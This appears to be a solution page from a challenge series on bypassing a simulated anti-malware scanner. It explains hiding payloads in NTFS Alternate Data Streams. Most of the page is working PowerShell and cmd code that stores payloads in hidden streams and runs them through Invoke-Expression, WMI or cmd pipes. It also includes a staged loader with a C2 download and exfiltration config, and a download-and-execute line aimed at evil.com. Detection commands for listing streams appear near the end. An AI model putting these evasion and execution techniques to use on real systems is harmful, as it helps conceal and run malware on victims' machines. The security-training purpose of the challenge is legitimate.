---
title: "Solution 28: NTFS Alternate Data Streams (ADS)"
challenge_number: 28
difficulty: hard
category: "Extension Heuristic Bypass"
permalink: /solutions/28-ntfs-ads/
---

# Solution: NTFS Alternate Data Streams (ADS)

[Back to Challenge](../challenges/28-ntfs-ads.md)

## Overview

NTFS Alternate Data Streams allow multiple data streams to be attached to a single file. The main (default) stream is what you normally see and what most scanners read. Additional named streams (e.g., `file.txt:hidden`) are invisible to standard directory listings and file reads. The scanner only reads the main stream content, completely missing payloads hidden in alternate streams.

## Working Code

### Basic ADS Payload

```powershell
# Create an innocent-looking file (main stream)
Set-Content -Path "innocent.txt" -Value "This is a normal text file. Nothing to see here."

# Hide payload in an Alternate Data Stream
Set-Content -Path "innocent.txt:payload" -Value 'Write-Host "ADS payload executed!"; whoami'

# The main file looks clean
Get-Content "innocent.txt"
# Output: This is a normal text file. Nothing to see here.

# Execute the hidden stream
powershell -Command "Get-Content innocent.txt:payload | Invoke-Expression"
# Output: ADS payload executed!
#         DOMAIN\username
```

### Multiple Hidden Streams

```powershell
# A single file can have many alternate streams
Set-Content -Path "report.docx" -Value "Quarterly financial report..."

# Hide different payloads in different streams
Set-Content -Path "report.docx:stage1" -Value @'
$client = New-Object Net.WebClient
$client.DownloadString("http://example.com/c2")
'@

Set-Content -Path "report.docx:stage2" -Value @'
Get-Process | Select-Object Name, Id | Out-File "$env:TEMP\procs.txt"
'@

Set-Content -Path "report.docx:config" -Value @'
{"c2_server": "10.0.0.1", "interval": 60, "exfil_path": "/upload"}
'@

# Execute specific stream
powershell -Command "& { Invoke-Expression (Get-Content report.docx:stage1 -Raw) }"
```

### Binary Payload in ADS

```powershell
# Hide a binary executable in an ADS
$exeBytes = [System.IO.File]::ReadAllBytes("payload.exe")
$adsPath = "innocent.txt:hidden.exe"

# Write binary data to ADS
[System.IO.File]::WriteAllBytes("$PWD\$adsPath", $exeBytes)

# Execute directly from ADS (works on older Windows versions)
Start-Process ".\innocent.txt:hidden.exe"

# On newer Windows, extract and execute
$bytes = [System.IO.File]::ReadAllBytes("$PWD\$adsPath")
[System.IO.File]::WriteAllBytes("$env:TEMP\temp.exe", $bytes)
Start-Process "$env:TEMP\temp.exe"
```

### Self-Extracting ADS Payload

```powershell
# Main stream contains the "extractor" logic
@'
# This looks like a normal script
Write-Host "Initializing system check..."

# But it reads and executes from its own ADS
$myPath = $MyInvocation.MyCommand.Path
$hidden = Get-Content "${myPath}:core" -Raw
Invoke-Expression $hidden
'@ | Set-Content "system_check.ps1"

# Hide the real payload in the script's own ADS
Set-Content -Path "system_check.ps1:core" -Value @'
Write-Host "[!] Hidden payload from ADS executed"
Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version
Get-NetIPAddress | Where-Object AddressFamily -eq "IPv4" | Select-Object IPAddress
'@

# When the script runs, it reads its own hidden stream
powershell -File "system_check.ps1"
```

### Using cmd.exe with ADS

```powershell
# ADS works with batch files too
Set-Content -Path "readme.txt" -Value "Please read the documentation at https://example.com"

# Hide batch commands in ADS
Set-Content -Path "readme.txt:run.bat" -Value @"
@echo off
echo Executed from ADS
net user
ipconfig /all > %TEMP%\netinfo.txt
"@

# Execute via cmd
cmd /c "type readme.txt:run.bat | cmd"

# Or use more /E
more /E < "readme.txt:run.bat" | cmd
```

### WMI Execution from ADS

```powershell
# Hide a command in ADS and execute via WMI
Set-Content -Path "notes.txt" -Value "Meeting notes from today"
Set-Content -Path "notes.txt:exec" -Value "calc.exe"

# Read the stream and execute via WMI
$cmd = Get-Content "notes.txt:exec" -Raw
([wmiclass]"Win32_Process").Create($cmd.Trim())
```

### Listing All Streams on a File

```powershell
# Enumerate ADS (useful for detection/verification)
Get-Item "innocent.txt" -Stream *

# Output:
# PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\...\innocent.txt::$DATA
# PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\...
# FileName      : C:\...\innocent.txt
# Stream        : :$DATA         <-- Main stream
# Length        : 50
#
# PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\...\innocent.txt:payload
# Stream        : payload        <-- Hidden stream!
# Length        : 52

# Using dir /r from cmd shows ADS
cmd /c "dir /r innocent.txt"
```

## Why It Works

The scanner reads file content like this:

```nim
let content = readFile(filename)  # Reads DEFAULT stream only
```

When you call `readFile("innocent.txt")` or equivalent, the OS returns ONLY the main (`::$DATA`) stream content. Alternate streams require explicitly specifying the stream name:
- `innocent.txt` → reads main stream ("Nothing to see here")
- `innocent.txt:payload` → reads the hidden payload

The scanner:
1. Opens `innocent.txt` → sees only "This is a normal text file. Nothing to see here."
2. Searches for signatures → finds none
3. Checks extension `.txt` → not in suspicious list
4. **Result: CLEAN** — the payload in `:payload` stream was never examined

Key properties of ADS that enable this bypass:
- **Invisible to standard listings**: `dir`, `ls`, `Get-ChildItem` don't show ADS by default
- **Invisible to standard reads**: `type`, `cat`, `Get-Content` without `-Stream` read only main stream
- **Zero file size impact visible**: The main file's size doesn't change when ADS is added
- **Survives file copies on NTFS**: ADS persists when copying within NTFS volumes
- **Executable**: Content in ADS can be directly executed or piped to interpreters

## How to Verify

1. Create a file with hidden ADS payload:
   ```powershell
   Set-Content -Path "clean_file.txt" -Value "Absolutely nothing suspicious here."
   Set-Content -Path "clean_file.txt:hidden" -Value 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell")'
   ```

2. Run the scanner on the file:
   ```
   nim_antimalware_sim.exe clean_file.txt
   ```

3. Expected result: **No detection** — the scanner reads only "Absolutely nothing suspicious here." from the main stream. The malicious PowerShell in `:hidden` is never scanned.

4. Verify the main stream is clean:
   ```powershell
   Get-Content "clean_file.txt"
   # Output: Absolutely nothing suspicious here.
   ```

5. Verify the hidden stream exists:
   ```powershell
   Get-Content "clean_file.txt:hidden"
   # Output: IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell")
   ```

6. Prove execution works:
   ```powershell
   # Safe test (replace malicious content with something benign)
   Set-Content -Path "clean_file.txt:hidden" -Value 'Write-Host "ADS execution confirmed"'
   powershell -Command "Get-Content clean_file.txt:hidden | Invoke-Expression"
   # Output: ADS execution confirmed
   ```

7. Verify streams are invisible to normal tools:
   ```powershell
   Get-Item "clean_file.txt" | Select-Object Name, Length
   # Length shows only main stream size
   # No indication of ADS presence
   ```
